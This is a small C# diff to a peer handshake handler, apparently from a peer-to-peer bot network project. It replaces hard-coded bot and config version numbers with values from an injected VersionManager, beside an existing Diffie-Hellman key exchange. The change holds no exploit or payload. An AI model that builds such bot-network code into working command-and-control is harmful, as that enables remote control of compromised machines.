@@ -10,11 +10,13 @@ namespace Vinchuca.Network.Protocol.Handlers
     {
         private readonly PeerList _peerList;
         private readonly MessageManager _messageManager;
+        private readonly VersionManager _versionManager;
 
-        public HelloSynMessageHandler(PeerList peerList, MessageManager messageManager)
+        public HelloSynMessageHandler(PeerList peerList, MessageManager messageManager, VersionManager _versionManager)
         {
             _peerList = peerList;
             _messageManager = messageManager;
+            this._versionManager = _versionManager;
         }
 
         public void Handle(BotMessage botMessage)
@@ -28,8 +30,8 @@ namespace Vinchuca.Network.Protocol.Handlers
                 peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);
 
                 var reply = new HelloAckSynMessage {
-                    BotVersion = 1,
-                    CfgVersion = 1,
+                    BotVersion = _versionManager.AgentVersion,
+                    CfgVersion = _versionManager.ConfigurationFileVersion,
                     PublicKey = BotIdentifier.PublicKey,
                 };
                 _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);
